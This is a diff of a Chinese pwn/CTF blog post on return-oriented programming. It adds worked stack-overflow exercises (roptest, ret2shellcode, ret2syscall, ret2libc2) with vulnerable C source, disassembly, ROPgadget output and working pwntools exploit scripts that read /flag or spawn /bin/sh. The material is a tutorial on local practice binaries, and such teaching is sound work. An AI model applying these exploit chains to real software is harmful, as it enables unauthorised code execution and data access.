@@ -7,7 +7,7 @@
 <meta name="robots" content="index, follow">
 <title>ROP基础 | 果汁天下苏&#39;s Blog</title>
 <meta name="keywords" content="">
-<meta name="description" content="1. ROP介绍 栈溢出大家都打过吧， 栈溢出通过Ret返回到黑客输入的shellcode处执行。但是不是所有有栈溢出漏洞的程序都有写shellcode的权限。有的程序有但是Date段和Text段也不会有执行权限，这个时候就需要通过程序内中的已有的汇编指令来进行拼接实现Shellcode">
+<meta name="description" content="如何利用栈溢出漏洞">
 <meta name="author" content="果汁天下苏">
 <link rel="canonical" href="http://guozhi1.github.io/posts/pwn/rop%E5%9F%BA%E7%A1%80/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.css" rel="preload stylesheet" as="style">
@@ -74,7 +74,7 @@ var _hmt = _hmt || [];
 })();
 </script>
 <meta property="og:title" content="ROP基础" />
-<meta property="og:description" content="1. ROP介绍 栈溢出大家都打过吧， 栈溢出通过Ret返回到黑客输入的shellcode处执行。但是不是所有有栈溢出漏洞的程序都有写shellcode的权限。有的程序有但是Date段和Text段也不会有执行权限，这个时候就需要通过程序内中的已有的汇编指令来进行拼接实现Shellcode" />
+<meta property="og:description" content="如何利用栈溢出漏洞" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://guozhi1.github.io/posts/pwn/rop%E5%9F%BA%E7%A1%80/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2023-11-15T14:59:44+08:00" />
@@ -82,7 +82,7 @@ var _hmt = _hmt || [];
 
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="ROP基础"/>
-<meta name="twitter:description" content="1. ROP介绍 栈溢出大家都打过吧， 栈溢出通过Ret返回到黑客输入的shellcode处执行。但是不是所有有栈溢出漏洞的程序都有写shellcode的权限。有的程序有但是Date段和Text段也不会有执行权限，这个时候就需要通过程序内中的已有的汇编指令来进行拼接实现Shellcode"/>
+<meta name="twitter:description" content="如何利用栈溢出漏洞"/>
 
 
 <script type="application/ld+json">
@@ -119,12 +119,12 @@ var _hmt = _hmt || [];
   "@type": "BlogPosting",
   "headline": "ROP基础",
   "name": "ROP基础",
-  "description": "1. ROP介绍 栈溢出大家都打过吧， 栈溢出通过Ret返回到黑客输入的shellcode处执行。但是不是所有有栈溢出漏洞的程序都有写shellcode的权限。有的程序有但是Date段和Text段也不会有执行权限，这个时候就需要通过程序内中的已有的汇编指令来进行拼接实现Shellcode",
+  "description": "如何利用栈溢出漏洞",
   "keywords": [
     ""
   ],
-  "articleBody": "1. ROP介绍 栈溢出大家都打过吧， 栈溢出通过Ret返回到黑客输入的shellcode处执行。但是不是所有有栈溢出漏洞的程序都有写shellcode的权限。有的程序有但是Date段和Text段也不会有执行权限，这个时候就需要通过程序内中的已有的汇编指令来进行拼接实现Shellcode功能。\n1.1 题目分析 int main(){ char name[16]; read(0,name,128); } int foo(){ return open(\"/flag\", 0); } int bar(){ int x = open(\"/notflag\", 0); sendfile(1,x,0,1024); } read是一个溢出点，但是但是没有能直接读取/flag。 sendfile()可以但是读的变量 是x这个时候就需要通过 操控栈来让程序执行open(\"/flag\", 0) 之后可以通过sendfile() 函数来读取/flag\n像搭积木一样把函数再内存中进行拼装。\n编译它\ngcc -fno-stack-protector -no-pie -o roptest roptest.c 关闭了程序地址随机化(PIE) 关闭了金丝雀 这不是这期的重点，重点是学习ROP，不是绕过防御机制。\n攻击链路\n通过栈溢出 —\u003e 执行open(/flag) ret到 —\u003e sendfile() 函数 —\u003e 得到flag 文件\n这是objdump 反编译的重要函数 读注释的代码\n0000000000401176 : 401176:\tf3 0f 1e fa endbr64 40117a:\t55 push rbp //8个字节 40117b:\t48 89 e5 mov rbp,rsp 40117e:\t48 83 ec 10 sub rsp,0x10 401182:\t48 8d 45 f0 lea rax,[rbp-0x10] //Name变量 16 个字节 401186:\tba 80 00 00 00 mov edx,0x80 40118b:\t48 89 c6 mov rsi,rax 40118e:\tbf 00 00 00 00 mov edi,0x0 401193:\tb8 00 00 00 00 mov eax,0x0 401198:\te8 c3 fe ff ff call 401060 // 溢出点 8+16溢出点 40119d:\tb8 00 00 00 00 mov eax,0x0 4011a2:\tc9 leave 4011a3:\tc3 ret //跳到OPen(/flag ) 0x4011ac 00000000004011a4 : 4011a4:\tf3 0f 1e fa endbr64 4011a8:\t55 push rbp 4011a9:\t48 89 e5 mov rbp,rsp 4011ac:\tbe 00 00 00 00 mov esi,0x0 //open的0参数 4011b1:\t48 8d 3d 4c 0e 00 00 lea rdi,[rip+0xe4c] //这是/flag字符串 # 402004 \u003c_IO_stdin_used+0x4\u003e 4011b8:\tb8 00 00 00 00 mov eax,0x0 //预设返回值 4011bd:\te8 be fe ff ff call 401080 4011c2:\t5d pop rbp //做填充 4011c3:\tc3 ret // 跳转到0x4011ec sendfile函数来读取Flag 00000000004011c4 : 4011c4:\tf3 0f 1e fa endbr64 4011c8:\t55 push rbp 4011c9:\t48 89 e5 mov rbp,rsp 4011cc:\t48 83 ec 10 sub rsp,0x10 4011d0:\tbe 00 00 00 00 mov esi,0x0 4011d5:\t48 8d 3d 2e 0e 00 00 lea rdi,[rip+0xe2e] # 40200a \u003c_IO_stdin_used+0xa\u003e 4011dc:\tb8 00 00 00 00 mov eax,0x0 4011e1:\te8 9a fe ff ff call 401080 4011e6:\t89 45 fc mov DWORD PTR [rbp-0x4],eax 4011e9:\t8b 45 fc mov eax,DWORD PTR [rbp-0x4] 4011ec:\tb9 00 04 00 00 mov ecx,0x400 //0x400 = 1024 4011f1:\tba 00 00 00 00 mov edx,0x0 4011f6:\t89 c6 mov esi,eax 4011f8:\tbf 01 00 00 00 mov edi,0x1 4011fd:\tb8 00 00 00 00 mov eax,0x0 401202:\te8 69 fe ff ff call 401070 //执行到这个函数成功的读取Flag文件 401207:\t90 nop 401208:\tc9 leave 401209:\tc3 ret 40120a:\t66 0f 1f 44 00 00 nop WORD PTR [rax+rax*1+0x0] 2 EXP from pwn import * r = process(\"./RopTest\") r.send(#填充 name b\"a\"*16+ #填充 rbp b\"b\" * 8+ #填充 rip p64(0x4011ac)+ #填充 pop rbp b'c'*8+ # 填充 foo ret p64(0x4011ec) ) #print(r.readall()) r.interactive() ",
-  "wordCount" : "895",
+  "articleBody": "1. ROP介绍 栈溢出大家都打过吧， 栈溢出通过Ret返回到黑客输入的shellcode处执行。但是不是所有有栈溢出漏洞的程序都有写shellcode的权限。有的程序有但是Date段和Text段也不会有执行权限，这个时候就需要通过程序内中的已有的汇编指令来进行拼接实现Shellcode功能。\nroptest 1.1 题目分析 int main(){ char name[16]; read(0,name,128); } int foo(){ return open(\"/flag\", 0); } int bar(){ int x = open(\"/notflag\", 0); sendfile(1,x,0,1024); } read是一个溢出点，但是但是没有能直接读取/flag。 sendfile()可以但是读的变量 是x这个时候就需要通过 操控栈来让程序执行open(\"/flag\", 0) 之后可以通过sendfile() 函数来读取/flag\n像搭积木一样把函数再内存中进行拼装。\n编译它\ngcc -fno-stack-protector -no-pie -o roptest roptest.c 关闭了程序地址随机化(PIE) 关闭了金丝雀 这不是这期的重点，重点是学习ROP，不是绕过防御机制。\n攻击链路\n通过栈溢出 —\u003e 执行open(/flag) ret到 —\u003e sendfile() 函数 —\u003e 得到flag 文件\n这是objdump 反编译的重要函数 读注释的代码\n0000000000401176 : 401176:\tf3 0f 1e fa endbr64 40117a:\t55 push rbp //8个字节 40117b:\t48 89 e5 mov rbp,rsp 40117e:\t48 83 ec 10 sub rsp,0x10 401182:\t48 8d 45 f0 lea rax,[rbp-0x10] //Name变量 16 个字节 401186:\tba 80 00 00 00 mov edx,0x80 40118b:\t48 89 c6 mov rsi,rax 40118e:\tbf 00 00 00 00 mov edi,0x0 401193:\tb8 00 00 00 00 mov eax,0x0 401198:\te8 c3 fe ff ff call 401060 // 溢出点 8+16溢出点 40119d:\tb8 00 00 00 00 mov eax,0x0 4011a2:\tc9 leave 4011a3:\tc3 ret //跳到OPen(/flag ) 0x4011ac 00000000004011a4 : 4011a4:\tf3 0f 1e fa endbr64 4011a8:\t55 push rbp 4011a9:\t48 89 e5 mov rbp,rsp 4011ac:\tbe 00 00 00 00 mov esi,0x0 //open的0参数 4011b1:\t48 8d 3d 4c 0e 00 00 lea rdi,[rip+0xe4c] //这是/flag字符串 # 402004 \u003c_IO_stdin_used+0x4\u003e 4011b8:\tb8 00 00 00 00 mov eax,0x0 //预设返回值 4011bd:\te8 be fe ff ff call 401080 4011c2:\t5d pop rbp //做填充 4011c3:\tc3 ret // 跳转到0x4011ec sendfile函数来读取Flag 00000000004011c4 : 4011c4:\tf3 0f 1e fa endbr64 4011c8:\t55 push rbp 4011c9:\t48 89 e5 mov rbp,rsp 4011cc:\t48 83 ec 10 sub rsp,0x10 4011d0:\tbe 00 00 00 00 mov esi,0x0 4011d5:\t48 8d 3d 2e 0e 00 00 lea rdi,[rip+0xe2e] # 40200a \u003c_IO_stdin_used+0xa\u003e 4011dc:\tb8 00 00 00 00 mov eax,0x0 4011e1:\te8 9a fe ff ff call 401080 4011e6:\t89 45 fc mov DWORD PTR [rbp-0x4],eax 4011e9:\t8b 45 fc mov eax,DWORD PTR [rbp-0x4] 4011ec:\tb9 00 04 00 00 mov ecx,0x400 //0x400 = 1024 4011f1:\tba 00 00 00 00 mov edx,0x0 4011f6:\t89 c6 mov esi,eax 4011f8:\tbf 01 00 00 00 mov edi,0x1 4011fd:\tb8 00 00 00 00 mov eax,0x0 401202:\te8 69 fe ff ff call 401070 //执行到这个函数成功的读取Flag文件 401207:\t90 nop 401208:\tc9 leave 401209:\tc3 ret 40120a:\t66 0f 1f 44 00 00 nop WORD PTR [rax+rax*1+0x0] 2 EXP from pwn import * r = process(\"./RopTest\") r.send(#填充 name b\"a\"*16+ #填充 rbp b\"b\" * 8+ #填充 rip p64(0x4011ac)+ #填充 pop rbp b'c'*8+ # 填充 foo ret p64(0x4011ec) ) #print(r.readall()) r.interactive() ret2shellcode 1. 源码分析 int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(\"No system for you this time !!!\"); gets((char *)\u0026v4); //栈溢出点 strncpy(buf2, (const char *)\u0026v4, 0x64u); //shellcode 复制到Buf2 printf(\"bye bye ~\"); return 0; } 这道题是溢出写shellcode int v4是局部变量不会有固定的地址\nstrncpy 函数 0x804a080 的地址是buf2 变量的这样V4被复制到Buf2中shellcode就有了一个固定的地址\n8048598:\tc7 44 24 08 64 00 00 mov DWORD PTR [esp+0x8],0x64 804859f:\t00 80485a0:\t8d 44 24 1c lea eax,[esp+0x1c] 80485a4:\t89 44 24 04 mov DWORD PTR [esp+0x4],eax 80485a8:\tc7 04 24 80 a0 04 08 mov DWORD PTR [esp],0x804a080 80485af:\te8 6c fe ff ff call 8048420 2. 构建Exp v4 大小是100\n07:001c│ eax 0xffffd0dc ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' ... ↓ 24 skipped 20:0080│ edx 0xffffd140 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c 21:0084│-004 0xffffd144 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c 22:0088│ ebp 0xffffd148 ◂— 0x0 可以看到下面两位被got表占了不知道为什么 再填充 8byte 覆盖ebp 再加 4byte\n100 + 8 + 4 = 112 byte\nfrom pwn import * r = process('./ret2shellcode') raw_input() sddaddr = 0x804a080 shell = asm(shellcraft.sh()) print(len(shell)) print(shell.ljust(0x70,b'A')+p32(sddaddr)) r.recvuntil('!!!') r.sendline(shell.ljust(0x70,b'A')+p32(sddaddr)) r.interactive() 因为不知道shellcode的长度所以使用 ljust函数来填充如果shellcode长度不够就用A来填充\nret2syscall 源码分析 int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(\"This time, no system() and NO SHELLCODE!!!\"); puts(\"What do you plan to do?\"); gets(\u0026v4); return 0; } 这道题通过程序内已有的汇编代码从获取shell 需要截取gadget片段 控制程序流从而获得shell\ngadge片段是指 操作寄存距离ret 操作数近的汇编指令 如 pop eax ; ret\nexecve(\"/bin/sh\", NULL,NULL) execve的系统调用号 eax 0xb 第一个参数 ebx 执行\"/bin/sh\" 第二个参数指向 ecx 为 0 第三个参数执行 edx 为 0 然后通过gadge 片段去操控寄存器 流程这样的 把栈上的数据pop 到寄存修改完几个寄存器 跳到int 0x80 执行execve就会成功调用shell\n通过ROPgadge 工具寻找可用gadge片段\nguozhi@guozhi-virtual-machine:~/桌面/ctfpwn$ ROPgadget --binary ./rop --only \"pop|ret\" | grep 'eax' 0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret 0x080bb196 : pop eax ; ret 0x0807217a : pop eax ; ret 0x80e 0x0804f704 : pop eax ; ret 3 0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret guozhi@guozhi-virtual-machine:~/桌面/ctfpwn$ ROPgadget --binary ./rop --only \"pop|ret\" | grep 'edx' 0x0806eb69 : pop ebx ; pop edx ; ret 0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret 0x0806eb6a : pop edx ; ret 0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret guozhi@guozhi-virtual-machine:~/桌面/ctfpwn$ ROPgadget --binary ./rop --string '/bin/sh' Strings information ============================================================ 0x080be408 : /bin/sh guozhi@guozhi-virtual-machine:~/桌面/ctfpwn$ ROPgadget --binary ./rop --only 'int' Gadgets information ============================================================ 0x08049421 : int 0x80 Unique gadgets found: 1 guozhi@guozhi-virtual-machine:~/桌面/ctfpwn$ 构造exp from pwn import * r = process('./rop') pop_eax_ret = 0x080bb196 pop_edx_ecx_ebx_ret = 0x0806eb90 sh = 0x080be408 int_0x80 = 0x08049421 p = flat( ['a'*112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0,0,sh,int_0x80] ) r.sendline(p) r.interactive() ret2libc2 1.源码分析 存在system函数但是不存在/bin/sh字符串所以需要自己往里写, 往程序里写东西可用通过再次触发gets函数往指定的地址写东西，然后触发system函数。\nint __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [esp-68h] [ebp-68h] BYREF setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(\"Something surprise here, but I don't think it will work.\"); printf(\"What do you think ?\"); gets(\u0026v4); return 0; } 2.构建Exp from pwn import * r = process('./ret2libc2') system_plt = 0x8048490 gets_plt = 0x8048460 pop_ebx_ret = 0x0804843d buf = 0x804AF00 #看程序权限vmmap哪可以往里写就写哪 sh = b'/bin/sh' p = flat( ['a'*112, # 溢出填充 gets_plt, # 接收sh pop_ebx_ret, buf, # 接收的参数弹到ebx寄存中 system_plt, #调用systemcall 'c'*4, #垃圾数据填充systemcall第一个参数 buf#作为地址提交 ] ) r.sendline(p) r.sendline(sh) r.interactive() ",
+  "wordCount" : "2204",
   "inLanguage": "en",
   "datePublished": "2023-11-15T14:59:44+08:00",
   "dateModified": "2023-11-15T14:59:44+08:00",
@@ -257,6 +257,9 @@ var _hmt = _hmt || [];
             <h1 class="post-title">
                 ROP基础
             </h1>
+            <div class="post-description">
+                如何利用栈溢出漏洞
+            </div>
             <div class="post-meta">
 
 <style>
@@ -289,13 +292,13 @@ var _hmt = _hmt || [];
     
     <span id="post_meta_style_3">
         <span class="fa fa-file-word-o"></span>
-        <span>895字
+        <span>2204字
             &nbsp;&nbsp;
         </span>
     </span>
     <span id="post_meta_style_4">
         <span class="fa fa-clock-o"></span>
-        <span>2分钟
+        <span>5分钟
             &nbsp;&nbsp;
         </span>
     </span>
@@ -313,6 +316,7 @@ var _hmt = _hmt || [];
                 &nbsp;<a href="http://guozhi1.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/" style="color: var(--secondary)!important;">二进制</a>
                 &nbsp;<a href="http://guozhi1.github.io/tags/%E6%BC%8F%E6%B4%9E/" style="color: var(--secondary)!important;">漏洞</a>
                 &nbsp;<a href="http://guozhi1.github.io/tags/rop/" style="color: var(--secondary)!important;">ROP</a>
+                &nbsp;<a href="http://guozhi1.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="color: var(--secondary)!important;">栈溢出</a>
             </span>
         </span>
     </span>
@@ -372,14 +376,44 @@ var _hmt = _hmt || [];
             <span class="details">文章目录</span>
         </summary>
 
-        <div class="inner"><ul>
+        <div class="inner"><ul><ul>
                 <li>
-                    <a href="#1-rop%e4%bb%8b%e7%bb%8d" aria-label="1. ROP介绍">1. ROP介绍</a></li>
+                    <a href="#1-rop%e4%bb%8b%e7%bb%8d" aria-label="1. ROP介绍">1. ROP介绍</a></li></ul>
+                    
+                <li>
+                    <a href="#roptest" aria-label="roptest">roptest</a><ul>
+                        
                 <li>
                     <a href="#11-%e9%a2%98%e7%9b%ae%e5%88%86%e6%9e%90" aria-label="1.1 题目分析">1.1 题目分析</a></li>
                 <li>
-                    <a href="#2-exp" aria-label="2 EXP">2 EXP</a>
+                    <a href="#2-exp" aria-label="2 EXP">2 EXP</a></li></ul>
                 </li>
+                <li>
+                    <a href="#ret2shellcode" aria-label="ret2shellcode">ret2shellcode</a><ul>
+                        
+                <li>
+                    <a href="#1-%e6%ba%90%e7%a0%81%e5%88%86%e6%9e%90" aria-label="1. 源码分析">1. 源码分析</a></li>
+                <li>
+                    <a href="#2-%e6%9e%84%e5%bb%baexp" aria-label="2. 构建Exp">2. 构建Exp</a></li></ul>
+                </li>
+                <li>
+                    <a href="#ret2syscall" aria-label="ret2syscall">ret2syscall</a><ul>
+                        
+                <li>
+                    <a href="#%e6%ba%90%e7%a0%81%e5%88%86%e6%9e%90" aria-label="源码分析">源码分析</a></li>
+                <li>
+                    <a href="#%e6%9e%84%e9%80%a0exp" aria-label="构造exp">构造exp</a></li></ul>
+                </li>
+                <li>
+                    <a href="#ret2libc2" aria-label="ret2libc2">ret2libc2</a><ul>
+                        
+                <li>
+                    <a href="#1%e6%ba%90%e7%a0%81%e5%88%86%e6%9e%90" aria-label="1.源码分析">1.源码分析</a></li>
+                <li>
+                    <a href="#2%e6%9e%84%e5%bb%baexp" aria-label="2.构建Exp">2.构建Exp</a>
+                </li>
+            </ul>
+            </li>
             </ul>
         </div>
         </details>
@@ -445,6 +479,7 @@ var _hmt = _hmt || [];
 </script>
         <div class="post-content"><h3 id="1-rop介绍">1. ROP介绍<a hidden class="anchor" aria-hidden="true" href="#1-rop介绍">#</a></h3>
 <p>栈溢出大家都打过吧， 栈溢出通过Ret返回到黑客输入的shellcode处执行。但是不是所有有栈溢出漏洞的程序都有写shellcode的权限。有的程序有但是Date段和Text段也不会有执行权限，这个时候就需要通过程序内中的已有的汇编指令来进行拼接实现Shellcode功能。</p>
+<h2 id="roptest">roptest<a hidden class="anchor" aria-hidden="true" href="#roptest">#</a></h2>
 <h3 id="11-题目分析">1.1 题目分析<a hidden class="anchor" aria-hidden="true" href="#11-题目分析">#</a></h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
 </span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> name[<span style="color:#ae81ff">16</span>];
@@ -533,6 +568,158 @@ var _hmt = _hmt || [];
 </span></span><span style="display:flex;"><span>        p64(<span style="color:#ae81ff">0x4011ec</span>) 
 </span></span><span style="display:flex;"><span>        )
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#print(r.readall())</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="ret2shellcode">ret2shellcode<a hidden class="anchor" aria-hidden="true" href="#ret2shellcode">#</a></h2>
+<h3 id="1-源码分析">1. 源码分析<a hidden class="anchor" aria-hidden="true" href="#1-源码分析">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v4; <span style="color:#75715e">// [sp+1Ch] [bp-64h]@1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdout, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdin, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;No system for you this time !!!&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v4);  <span style="color:#75715e">//栈溢出点 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">strncpy</span>(buf2, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v4, <span style="color:#ae81ff">0x64u</span>); <span style="color:#75715e">//shellcode 复制到Buf2 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;bye bye ~&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>这道题是溢出写shellcode int v4是局部变量不会有固定的地址<br>
+strncpy 函数 0x804a080 的地址是buf2 变量的这样V4被复制到Buf2中shellcode就有了一个固定的地址</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span> 8048598:	c7 44 24 08 64 00 00 	mov    DWORD PTR [esp+0x8],0x64
+</span></span><span style="display:flex;"><span> 804859f:	00 
+</span></span><span style="display:flex;"><span> 80485a0:	8d 44 24 1c          	lea    eax,[esp+0x1c]
+</span></span><span style="display:flex;"><span> 80485a4:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
+</span></span><span style="display:flex;"><span> 80485a8:	c7 04 24 80 a0 04 08 	mov    DWORD PTR [esp],0x804a080
+</span></span><span style="display:flex;"><span> 80485af:	e8 6c fe ff ff       	call   8048420 &lt;strncpy@plt&gt;
+</span></span></code></pre></div><h3 id="2-构建exp">2. 构建Exp<a hidden class="anchor" aria-hidden="true" href="#2-构建exp">#</a></h3>
+<p>v4 大小是100</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>07:001c│ eax 0xffffd0dc ◂— &#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;
+</span></span><span style="display:flex;"><span>... ↓        24 skipped
+</span></span><span style="display:flex;"><span>20:0080│ edx 0xffffd140 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
+</span></span><span style="display:flex;"><span>21:0084│-004 0xffffd144 —▸ 0xf7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ead6c
+</span></span><span style="display:flex;"><span>22:0088│ ebp 0xffffd148 ◂— 0x0
+</span></span></code></pre></div><p>可以看到下面两位被got表占了不知道为什么 再填充 8byte 覆盖ebp 再加 4byte</p>
+<p>100 + 8 + 4 = 112 byte</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ret2shellcode&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>raw_input()
+</span></span><span style="display:flex;"><span>sddaddr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x804a080</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shell <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh())
+</span></span><span style="display:flex;"><span>print(len(shell))
+</span></span><span style="display:flex;"><span>print(shell<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x70</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>)<span style="color:#f92672">+</span>p32(sddaddr))
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;!!!&#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(shell<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x70</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>)<span style="color:#f92672">+</span>p32(sddaddr))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()                            
+</span></span></code></pre></div><p>因为不知道shellcode的长度所以使用 ljust函数来填充如果shellcode长度不够就用A来填充</p>
+<h2 id="ret2syscall">ret2syscall<a hidden class="anchor" aria-hidden="true" href="#ret2syscall">#</a></h2>
+<h3 id="源码分析">源码分析<a hidden class="anchor" aria-hidden="true" href="#源码分析">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>int __cdecl main(int argc, const char **argv, const char **envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  int v4; // [sp+1Ch] [bp-64h]@1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  setvbuf(stdout, 0, 2, 0);
+</span></span><span style="display:flex;"><span>  setvbuf(stdin, 0, 1, 0);
+</span></span><span style="display:flex;"><span>  puts(&#34;This time, no system() and NO SHELLCODE!!!&#34;);
+</span></span><span style="display:flex;"><span>  puts(&#34;What do you plan to do?&#34;);
+</span></span><span style="display:flex;"><span>  gets(&amp;v4); 
+</span></span><span style="display:flex;"><span>  return 0; 
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>这道题通过程序内已有的汇编代码从获取shell 需要截取gadget片段 控制程序流从而获得shell</p>
+<blockquote>
+<p>gadge片段是指 操作寄存距离ret 操作数近的汇编指令 如 pop eax ; ret</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>execve(&#34;/bin/sh&#34;, NULL,NULL)
+</span></span></code></pre></div><ul>
+<li>execve的系统调用号 eax  0xb</li>
+<li>第一个参数 ebx 执行&quot;/bin/sh&quot;</li>
+<li>第二个参数指向 ecx 为 0</li>
+<li>第三个参数执行 edx 为 0</li>
+</ul>
+<p>然后通过gadge 片段去操控寄存器  流程这样的
+<img loading="lazy" src="http://cdn.z3vvemhpcg.top/blog-image/20231118194507.png" alt=""  />
+</p>
+<p>把栈上的数据pop 到寄存修改完几个寄存器 跳到int 0x80 执行execve就会成功调用shell</p>
+<p>通过ROPgadge 工具寻找可用gadge片段</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>guozhi@guozhi-virtual-machine:~/桌面/ctfpwn$ ROPgadget --binary ./rop  --only <span style="color:#e6db74">&#34;pop|ret&#34;</span> | grep <span style="color:#e6db74">&#39;eax&#39;</span>
+</span></span><span style="display:flex;"><span>0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
+</span></span><span style="display:flex;"><span>0x080bb196 : pop eax ; ret
+</span></span><span style="display:flex;"><span>0x0807217a : pop eax ; ret 0x80e
+</span></span><span style="display:flex;"><span>0x0804f704 : pop eax ; ret <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
